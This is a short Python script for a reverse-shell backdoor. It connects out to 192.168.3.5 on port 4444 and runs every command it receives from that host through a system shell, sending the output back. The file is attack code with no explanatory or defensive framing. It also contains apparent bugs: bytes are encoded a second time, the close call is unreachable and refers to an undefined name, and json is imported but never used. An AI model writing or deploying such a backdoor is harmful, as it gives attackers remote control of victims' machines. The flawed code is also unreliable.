import json
import socket
import subprocess


class Reverce_backdoor:
    def __init__(self, ip, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))

    def execute_system_command(self, command):
        return subprocess.check_output(command.encode('utf-8'), shell=True)

    def run(self):
        while True:
            command = self.connection.recv(1024)
            command_result = self.execute_system_command(command.encode('utf-8'))
            self.connection.send(command_result)
        connection.close()


my_backdoor = Reverce_backdoor("192.168.3.5", 4444)
my_backdoor.run()
